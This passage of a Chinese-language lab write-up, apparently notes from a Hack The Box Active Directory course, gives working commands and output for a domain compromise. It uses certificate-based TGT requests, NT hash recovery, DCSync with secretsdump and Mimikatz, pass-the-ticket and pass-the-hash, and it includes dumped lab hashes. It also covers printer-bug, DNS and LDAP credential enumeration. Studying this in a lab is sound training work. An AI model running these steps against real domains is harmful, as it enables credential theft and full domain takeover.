qc++/HhF/GVRPfmacl1Bn3nNqYwmMcAhsnfgs8uDR9cItwh41T7STSDTU56rFRc86JYwbzEGCICHwgeh+s5Yb+7z9u+5HSy5QBObJeu5EIjVnu1eVWfEYs/Ks6FI3D/MMJFs+PcAKaVYCKYlA3sx9+83gk0NlAb9b1DrLZnNYd6CLq2N6Pew6hMSUwIwYJKoZIhvcNAQkVMRYEFLqyF797X2SL//FR1NM+UQsli2GgMC0wITAJBgUrDgMCGgUABBQ84uiZwm1Pz70+e0p2GZNVZDXlrwQIyr7YCKBdGmY=</span><br><span class="line">[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h4 id="使用-gettgtpkinit-py-请求-TGT"><a href="#使用-gettgtpkinit-py-请求-TGT" class="headerlink" title="使用 gettgtpkinit.py 请求 TGT"></a>使用 gettgtpkinit.py 请求 TGT</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache</span><br><span class="line"></span><br><span class="line">2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br></pre></td></tr></table></figure>

<h4 id="设置-KRB5CCNAME-环境变量"><a href="#设置-KRB5CCNAME-环境变量" class="headerlink" title="设置 KRB5CCNAME 环境变量"></a>设置 KRB5CCNAME 环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">export</span> KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure>

<h4 id="使用域控制器-TGT-进行-DCSync"><a href="#使用域控制器-TGT-进行-DCSync" class="headerlink" title="使用域控制器 TGT 进行 DCSync"></a>使用域控制器 TGT 进行 DCSync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass <span class="string">&quot;ACADEMY-EA-DC01$&quot;</span>@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>

<h4 id="运行-klist"><a href="#运行-klist" class="headerlink" title="运行 klist"></a>运行 klist</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:dc01.ccache</span><br><span class="line">Default principal: ACADEMY-EA-DC01<span class="variable">$@INLANEFREIGHT</span>.LOCAL</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<h4 id="确认对域控制器的管理员访问权限"><a href="#确认对域控制器的管理员访问权限" class="headerlink" title="确认对域控制器的管理员访问权限"></a>确认对域控制器的管理员访问权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br></pre></td></tr></table></figure>

<h4 id="使用-getnthash-py-为自己提交-TGS-请求"><a href="#使用-getnthash-py-为自己提交-TGS-请求" class="headerlink" title="使用 getnthash.py 为自己提交 TGS 请求"></a>使用 getnthash.py 为自己提交 TGS 请求</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">313b6f423cd1ee07e91315b4919fb4ba</span><br></pre></td></tr></table></figure>

<h4 id="利用域控制器-NTLM-哈希进行-DCSync"><a href="#利用域控制器-NTLM-哈希进行-DCSync" class="headerlink" title="利用域控制器 NTLM 哈希进行 DCSync"></a>利用域控制器 NTLM 哈希进行 DCSync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator <span class="string">&quot;ACADEMY-EA-DC01$&quot;</span>@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h4 id="请求-TGT-并使用-DC01-机器账户执行-PTT"><a href="#请求-TGT-并使用-DC01-机器账户执行-PTT" class="headerlink" title="请求 TGT 并使用 DC01$机器账户执行 PTT"></a>请求 TGT 并使用 DC01$机器账户执行 PTT</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; .\Rubeus.exe asktgt /user:ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span> /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> PKINIT with e<span class="keyword">type</span> rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.5.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"> doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBUR....</span><br><span class="line"> </span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL</span><br><span class="line">  ServiceRealm             :  INLANEFREIGHT.LOCAL</span><br><span class="line">  UserName                 :  ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br><span class="line">  UserRealm                :  INLANEFREIGHT.LOCAL</span><br><span class="line">  StartTime                :  <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> AM</span><br><span class="line">  RenewTill                :  <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==</span><br><span class="line">  ASREP (key)              :  <span class="number">2</span>A621F62C32241F38FA68826E95521DD</span><br></pre></td></tr></table></figure>

<h4 id="确认票据在内存中"><a href="#确认票据在内存中" class="headerlink" title="确认票据在内存中"></a>确认票据在内存中</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x4e56b</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x2 -&gt; DELEGATION</span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line"><span class="comment">#1&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br><span class="line"></span><br><span class="line"><span class="comment">#2&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: cifs/academy<span class="literal">-ea-dc01</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span></span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<h4 id="使用-Mimikatz-执行-DCSync"><a href="#使用-Mimikatz-执行-DCSync" class="headerlink" title="使用 Mimikatz 执行 DCSync"></a>使用 Mimikatz 执行 DCSync</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">cd</span> .\mimikatz\x64\</span><br><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:inlanefreight\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;inlanefreight\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">14</span>:<span class="number">34</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">4562458</span>c201a97fa19365ce901513c21</span><br></pre></td></tr></table></figure>

<h2 id="杂项配置错误"><a href="#杂项配置错误" class="headerlink" title="杂项配置错误"></a>杂项配置错误</h2><h3 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h3><h4 id="枚举-MS-PRN-打印机漏洞"><a href="#枚举-MS-PRN-打印机漏洞" class="headerlink" title="枚举 MS-PRN 打印机漏洞"></a>枚举 MS-PRN 打印机漏洞</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\SecurityAssessment.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-SpoolStatus</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">ComputerName                        Status</span><br><span class="line"><span class="literal">------------</span>                        <span class="literal">------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL   True</span><br></pre></td></tr></table></figure>

<h3 id="嗅探-LDAP-凭据"><a href="#嗅探-LDAP-凭据" class="headerlink" title="嗅探 LDAP 凭据"></a>嗅探 LDAP 凭据</h3><p>许多应用程序和打印机在其 Web 管理控制台中存储 LDAP 凭据以连接到域。这些控制台通常使用弱密码或默认密码。有时，这些凭据可以明文查看。其他时候，应用程序有一个 <code>test connection</code> 功能，我们可以通过将 LDAP IP 地址更改为我们的攻击主机，并在 LDAP 端口 389 上设置一个 <code>netcat</code> 监听器来收集凭据。当设备尝试测试 LDAP 连接时，它会将凭据发送到我们的机器，通常是明文形式。用于 LDAP 连接的账户通常具有特权，但即使没有，这也可以作为进入域的初始立足点。其他时候，需要一个完整的 LDAP 服务器来实施此攻击。</p>
<h3 id="枚举-DNS-记录"><a href="#枚举-DNS-记录" class="headerlink" title="枚举 DNS 记录"></a>枚举 DNS 记录</h3><p>我们可以使用诸如 adidnsdump 的工具，利用有效的域用户账户枚举域中的所有 DNS 记录。如果通过 <code>BloodHound</code> 等工具进行枚举时返回的主机命名约定与 <code>SRV01934.INLANEFREIGHT.LOCAL</code> 相似，这将特别有用。如果所有服务器和工作站都具有非描述性名称，我们将难以确定具体攻击目标。如果我们能够访问 AD 中的 DNS 条目，就有可能发现指向同一服务器的有趣 DNS 记录，例如 <code>JENKINS.INLANEFREIGHT.LOCAL</code> ，这有助于我们更好地规划攻击策略。</p>
<h4 id="使用-adidnsdump"><a href="#使用-adidnsdump" class="headerlink" title="使用 adidnsdump"></a>使用 adidnsdump</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 </span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone <span class="keyword">for</span> records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">head</span> records.csv </span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>,name,value</span><br><span class="line">?,LOGISTICS,?</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure>

<h4 id="使用-r-选项解析未知记录"><a href="#使用-r-选项解析未知记录" class="headerlink" title="使用 -r 选项解析未知记录"></a>使用 -r 选项解析未知记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone <span class="keyword">for</span> records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">head</span> records.csv </span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>,name,value</span><br><span class="line">A,LOGISTICS,172.16.5.240</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure>

<h3 id="其他配置错误"><a href="#其他配置错误" class="headerlink" title="其他配置错误"></a>其他配置错误</h3><h4 id="使用-Get-DomainUser-在描述字段中查找密码"><a href="#使用-Get-DomainUser-在描述字段中查找密码" class="headerlink" title="使用 Get-DomainUser 在描述字段中查找密码"></a>使用 Get-DomainUser 在描述字段中查找密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> * | <span class="built_in">Select-Object</span> samaccountname,description |<span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.Description <span class="operator">-ne</span> <span class="variable">$null</span>&#125;</span><br><span class="line"></span><br><span class="line">samaccountname description</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">-----------</span></span><br><span class="line">administrator  Built<span class="operator">-in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">guest          Built<span class="operator">-in</span> account <span class="keyword">for</span> guest access to the 